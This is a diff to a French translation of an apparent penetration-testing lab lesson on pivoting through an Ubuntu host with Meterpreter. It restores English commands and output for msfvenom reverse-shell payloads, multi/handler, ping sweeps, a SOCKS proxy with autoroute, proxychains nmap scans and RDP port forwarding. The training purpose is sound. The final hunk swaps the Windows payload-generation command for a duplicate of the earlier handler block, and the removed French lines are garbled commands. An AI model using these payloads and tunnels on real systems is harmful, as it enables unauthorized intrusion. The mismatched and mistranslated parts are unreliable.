@@ -12,12 +12,12 @@ Création de la charge utile pour l'hôte Ubuntu Pivot
 ```
 dsgsec@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
 
-[-] Aucune plate-forme n'a été sélectionnée, en choisissant Msf::Module::Platform::Linux à partir de la charge utile
-[-] Aucune arche sélectionnée, sélection de l'arche : x64 à partir de la charge utile
-Aucun encodeur spécifié, sortie de données utiles brutes
-Taille de la charge utile : 130 octets
-Taille finale du fichier elf : 250 octets
-Enregistré sous : tâche de sauvegarde
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 130 bytes
+Final size of elf file: 250 bytes
+Saved as: backupjob
 
 ```
 
@@ -28,17 +28,17 @@ Avant de copier la charge utile, nous pouvons démarrer un [multi/handler](http
 Configurer et démarrer le multi/handler
 
 ```
-msf6 > utiliser exploit/multi/gestionnaire
+msf6 > use exploit/multi/handler
 
-[*] Utilisation de la charge utile configurée generic/shell_reverse_tcp
-exploit msf6 (multi/gestionnaire)> définir lhost 0.0.0.0
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set lhost 0.0.0.0
 lhost => 0.0.0.0
-exploit msf6 (multi/gestionnaire)> définir lport 8080
+msf6 exploit(multi/handler) > set lport 8080
 lport => 8080
-exploit msf6 (multi/handler)> définir la charge utile linux/x64/meterpreter/reverse_tcp
-charge utile => linux/x64/meterpreter/reverse_tcp
-exploit msf6 (multi/gestionnaire)> exécuter
-[*] Démarrage du gestionnaire TCP inversé sur 0.0.0.0:8080
+msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
+payload => linux/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 0.0.0.0:8080 
 
 ```
 
@@ -49,11 +49,11 @@ Nous pouvons copier le fichier binaire `backupjob` sur l'hôte pivot Ubuntu `
 Exécution de la charge utile sur l'hôte pivot
 
 ```
-ubuntu@WebServer :~$ ls
+ubuntu@WebServer:~$ ls
 
-tâche de sauvegarde
-ubuntu@WebServer :~$ chmod +x tâche de sauvegarde
-ubuntu@WebServer :~$ ./tâche de sauvegarde
+backupjob
+ubuntu@WebServer:~$ chmod +x backupjob 
+ubuntu@WebServer:~$ ./backupjob
 
 ```
 
@@ -64,11 +64,11 @@ Nous devons nous assurer que la session Meterpreter est établie avec succès lo
 Création de session Meterpreter
 
 ```
-[*] Étape d'envoi (3020772 octets) à 10.129.202.64
-[*] Meterpreter session 1 ouverte (10.10.14.18:8080 -> 10.129.202.64:39826 ) au 2022-03-03 12:27:43 -0500
+[*] Sending stage (3020772 bytes) to 10.129.202.64
+[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500
 meterpreter > pwd
 
-/accueil/ubuntu
+/home/ubuntu
 
 ```
 
@@ -79,10 +79,9 @@ Nous savons que la cible Windows se trouve sur le réseau 172.16.5.0/23. Donc, e
 Balayage de ping
 
 ```
-meterpreter > exécuter post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
 
-[*] Effectuer un balayage ping pour la plage IP 172.16.5.0/23
-
+[*] Performing ping sweep for IP range 172.16.5.0/23
 ```
 
 Nous pourrions également effectuer un balayage ping à l'aide d'une `boucle for` directement sur un hôte pivot cible qui enverra un ping à n'importe quel appareil dans la plage de réseau que nous spécifions. Voici deux balayages ping utiles pour les lignes simples que nous pourrions utiliser pour les hôtes pivot basés sur Linux et Windows.
@@ -92,7 +91,7 @@ Nous pourrions également effectuer un balayage ping à l'aide d'une `boucle fo
 Ping Sweep For Loop sur les hôtes Linux Pivot
 
 ```
-for i in {1..254} ;faire (ping -c 1 172.16.5.$i | grep "octets de" &) ;fait
+for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
 
 ```
 
@@ -101,7 +100,7 @@ for i in {1..254} ;faire (ping -c 1 172.16.5.$i | grep "octets de" &) ;fait
 Balayage ping pour la boucle à l'aide de CMD
 
 ```
-for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | trouver "Répondre"
+for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
 
 ```
 
@@ -123,34 +122,35 @@ Il peut y avoir des scénarios où le pare-feu d'un hôte bloque le ping (ICMP),
 Configuration du proxy SOCKS de MSF
 
 ```
-msf6 > utiliser auxiliaire/serveur/socks_proxy
+msf6 > use auxiliary/server/socks_proxy
 
-msf6 auxiliaire (serveur/socks_proxy) > définir SRVPORT 9050
+msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
 SRVPORT => 9050
-msf6 auxiliaire (serveur/socks_proxy) > définir SRVHOST 0.0.0.0
+msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
 SRVHOST => 0.0.0.0
-msf6 auxiliaire (serveur/socks_proxy) > définir la version 4a
+msf6 auxiliary(server/socks_proxy) > set version 4a
 version => 4a
-msf6 auxiliaire (serveur/socks_proxy) > exécuter
-[*] Module auxiliaireexécuté en tant que travail d'arrière-plan 0.
+msf6 auxiliary(server/socks_proxy) > run
+[*] Auxiliary module running as background job 0.
 
-[*] Démarrage du serveur proxy SOCKS
-msf6 auxiliaire (serveur/socks_proxy) > options
+[*] Starting the SOCKS proxy server
+msf6 auxiliary(server/socks_proxy) > options
 
-Options du module (auxiliaire/serveur/socks_proxy) :
+Module options (auxiliary/server/socks_proxy):
 
-    Nom Paramètre actuel requis Description
-    ---- --------------- -------- -----------
-    SRVHOST 0.0.0.0 oui L'adresse à écouter
-    SRVPORT 9050 oui Le port sur lequel écouter
-    VERSION 4a oui La version SOCKS à utiliser (Accepté : 4a,
-                                         5)
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The address to listen on
+   SRVPORT  9050             yes       The port to listen on
+   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
+                                        5)
 
-Action auxiliaire :
 
-    Nom Descriptif
-    ---- -----------
-    Proxy Exécuter un serveur proxy SOCKS
+Auxiliary action:
+
+   Name   Description
+   ----   -----------
+   Proxy  Run a SOCKS proxy server
 
 ```
 
@@ -159,14 +159,14 @@ Action auxiliaire :
 Confirmation que le serveur proxy est en cours d'exécution
 
 ```
-msf6 auxiliaire (serveur/socks_proxy) > travaux
+msf6 auxiliary(server/socks_proxy) > jobs
 
-Emplois
+Jobs
 ====
 
-   Id Nom Payload Payload opts
-   -- ---- ------- ------------
-   0 Auxiliaire : serveur/socks_proxy
+  Id  Name                           Payload  Payload opts
+  --  ----                           -------  ------------
+  0   Auxiliary: server/socks_proxy
 
 ```
 
@@ -177,8 +177,7 @@ Après avoir lancé le serveur SOCKS, nous allons configurer des chaînes proxy 
 Ajouter une ligne à proxychains.conf si nécessaire
 
 ```
-chaussettes4 127.0.0.1 9050
-
+socks4 	127.0.0.1 9050
 ```
 
 Remarque : selon la version du serveur SOCKS, nous pouvons parfois avoir besoin de remplacer socks4 par socks5 dans proxychains.conf.
@@ -190,21 +189,21 @@ Enfin, nous devons dire à notre module socks_proxy de router tout le trafic via
 Création d'itinéraires avec AutoRoute
 
 ```
-msf6 > utiliser post/multi/gérer/autoroute
+msf6 > use post/multi/manage/autoroute
 
 msf6 post(multi/manage/autoroute) > set SESSION 1
-SÉANCE => 1
+SESSION => 1
 msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
-SOUS-RÉSEAU => 172.16.5.0
-msf6 post(multi/gérer/autoroute) > exécuter
+SUBNET => 172.16.5.0
+msf6 post(multi/manage/autoroute) > run
 
-[!] SESSION peut ne pas être compatible avec ce module :
-[!] * plate-forme de session incompatible : linux
-[*] Module en cours d'exécution contre 10.129.202.64
-[*] Recherche de sous-réseaux à autorouter.
-[+] Route ajoutée au sous-réseau 10.129.0.0/255.255.0.0 à partir de la table de routage de l'hôte.
-[+] Route ajoutée au sous-réseau 172.16.5.0/255.255.254.0 à partir de la table de routage de l'hôte.
-[*] Exécution du post-module terminée
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: linux
+[*] Running module against 10.129.202.64
+[*] Searching for subnets to autoroute.
+[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
+[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
+[*] Post module execution completed
 
 ```
 
@@ -215,12 +214,11 @@ Création d'itinéraires avec AutoRoute
 ```
 meterpreter > run autoroute -s 172.16.5.0/23
 
-[!] Les scripts Meterpreter sont obsolètes. Essayez post/multi/gérer/autoroute.
-[!] Exemple : lancez post/multi/manage/autoroute OPTION=valeur [...]
-[*] Ajout d'une route à 172.16.5.0/255.255.254.0...
-[+] Route ajoutée à 172.16.5.0/255.255.254.0 via 10.129.202.64
-[*] Utilisez l'option -p pour lister toutes les routes actives
-
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+[*] Adding a route to 172.16.5.0/255.255.254.0...
+[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
+[*] Use the -p option to list all active routes
 ```
 
 Après avoir ajouté la ou les routes nécessaires, nous pouvons utiliser l'option `-p` pour répertorier les routes actives afin de nous assurer que notre configuration est appliquée comme prévu.
@@ -230,19 +228,19 @@ Après avoir ajouté la ou les routes nécessaires, nous pouvons utiliser l'opti
 Liste des routes actives avec AutoRoute
 
 ```
-meterpreter > exécuter autoroute -p
+meterpreter > run autoroute -p
 
-[!] Les scripts Meterpreter sont obsolètes. Essayez post/multi/gérer/autoroute.
-[!] Exemple : lancez post/multi/manage/autoroute OPTION=valeur [...]
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
 
-Table de routage active
+Active Routing Table
 ====================
 
-    Passerelle de masque de réseau de sous-réseau
-    ------ ------- -------
-    10.129.0.0 255.255.0.0 Séance 1
-    172.16.4.0 255.255.254.0 Séance 1
-    172.16.5.0 255.255.254.0 Séance 1
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   10.129.0.0         255.255.0.0        Session 1
+   172.16.4.0         255.255.254.0      Session 1
+   172.16.5.0         255.255.254.0      Session 1
 
 ```
 
@@ -256,24 +254,23 @@ Test des fonctionnalités de proxy et de routage
 dsgsec@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
 
 ProxyChains-3.1 (http://proxychains.sf.net)
-Découverte d'hôte désactivée (-Pn). Toutes les adresses seront marquées "up" et les temps de balayage peuvent être plus lents.
-À partir de Nmap 7.92 ( https://nmap.org ) au 2022-03-03 13:40 EST
-Lancement de la résolution DNS parallèle d'un hôte. à 13h40
-Résolution DNS parallèle terminée de 1 hôte. à 13h40, 0.12s écoulé
-Lancement de Connect Scan à 13:40
-Balayage 172.16.5.19 [1 port]
-|Chaîne en S|-<>-127.0.0.1:9050-<><>-172.16.5.19 :3389-<><>-OK
-Découverte du port ouvert 3389/tcp sur 172.16.5.19
-Scan de connexion terminé à 13h40, 0,12 s écoulé (1 port au total)
-Rapport d'analyse Nmap pour 172.16.5.19
-L'hôte est actif (latence de 0,12 s).
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-03 13:40 EST
+Initiating Parallel DNS resolution of 1 host. at 13:40
+Completed Parallel DNS resolution of 1 host. at 13:40, 0.12s elapsed
+Initiating Connect Scan at 13:40
+Scanning 172.16.5.19 [1 port]
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19 :3389-<><>-OK
+Discovered open port 3389/tcp on 172.16.5.19
+Completed Connect Scan at 13:40, 0.12s elapsed (1 total ports)
+Nmap scan report for 172.16.5.19 
+Host is up (0.12s latency).
 
-SERVICE DE L'ÉTAT DU PORT
-3389/tcp ouvrir le serveur ms-wbt
+PORT     STATE SERVICE
+3389/tcp open  ms-wbt-server
 
-Lire les fichiers de données depuis : /usr/bin/../share/nmap
-Nmap done : 1 adresse IP (1 hôte actif) scannée en 0,45 seconde
-
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
 ```
 
 * * * * *
@@ -288,19 +285,20 @@ La redirection de port peut également être effectuée à l'aide du module `po
 Options de transfert
 
 ```
-meterpreter > aide portfwd
+meterpreter > help portfwd
 
-Utilisation : portfwd [-h] [ajouter | supprimer | liste | flush] [arguments]
+Usage: portfwd [-h] [add | delete | list | flush] [args]
 
-OPTIONS :
 
-     -h Bannière d'aide.
-     -i <opt> Index de l'entrée de redirection de port avec laquelle interagir (voir la commande "list").
-     -l <opt> Forward : port local à écouter. Inverse : port local auquel se connecter.
-     -L <opt> Forward : hôte local sur lequel écouter (optionnel). Inverse : hôte local auquel se connecter.
-     -p <opt> Forward : port distant auquel se connecter. Reverse : port distant sur lequel écouter.
-     -r <opt> Forward : hôte distant auquel se connecter.
-     -R Indique une redirection de port inverse.
+OPTIONS:
+
+    -h        Help banner.
+    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
+    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
+    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
+    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
+    -r <opt>  Forward: remote host to connect to.
+    -R        Indicates a reverse port forward.
 
 ```
 
@@ -311,8 +309,7 @@ Création d'un relais TCP local
 ```
 meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
 
-[*] Relais TCP local créé : :3300 <-> 172.16.5.19:3389
-
+[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
 ```
 
 La commande ci-dessus demande à la session Meterpreter de démarrer un écouteur sur le port local de notre hôte d'attaque (`-l`) `3300` et de transférer tous les paquets vers le serveur Windows distant (`-r`) `172.16.5.19` sur `3389 ` port (`-p`) via notre session Meterpreter. Maintenant, si nous exécutons xfreerdp sur notre localhost:3300, nous pourrons créer une session de bureau à distance.
@@ -366,16 +363,16 @@ Configurer et démarrer le multi/gestionnaire
 ```
 meterpreter > bg
 
-[*] Séance d'information 1...
-msf6 exploit(multi/handler) > définir la charge utile windows/x64/meterpreter/reverse_tcp
-charge utile => windows/x64/meterpreter/reverse_tcp
-exploit msf6 (multi/gestionnaire)> définir LPORT 8081
+[*] Backgrounding session 1...
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LPORT 8081 
 LPORT => 8081
-exploit msf6 (multi/gestionnaire)> définir LHOST 0.0.0.0
-LHÔTE => 0.0.0.0
-exploit msf6 (multi/gestionnaire)> exécuter
+msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
+LHOST => 0.0.0.0
+msf6 exploit(multi/handler) > run
 
-[*] Démarrage du gestionnaire TCP inversé sur 0.0.0.0:8081
+[*] Started reverse TCP handler on 0.0.0.0:8081 
 
 ```
 
@@ -386,15 +383,18 @@ Nous pouvons maintenant créer une charge utile reverse shell qui renverra une c
 Génération de la charge utile Windows
 
 ```
-dsgsec@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
+meterpreter > bg
 
-[-] Aucune plate-forme n'a été sélectionnée, en choisissant Msf::Module::Platform::Windows à partir de la charge utile
-[-] Aucune arche sélectionnée, sélection de l'arche : x64 à partir de la charge utile
-Aucun encodeur spécifié, sortie de données utiles brutes
-Taille de la charge utile : 510 octets
-Taille finale du fichier exe : 7168 octets
-Enregistré sous : backupscript.exe
+[*] Backgrounding session 1...
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LPORT 8081 
+LPORT => 8081
+msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
+LHOST => 0.0.0.0
+msf6 exploit(multi/handler) > run
 
+[*] Started reverse TCP handler on 0.0.0.0:8081 
 ```
 
 Enfin, si nous exécutons notre charge utile sur l'hôte Windows, nous devrions pouvoir recevoir un shell de Windows pivoté via le serveur Ubuntu.
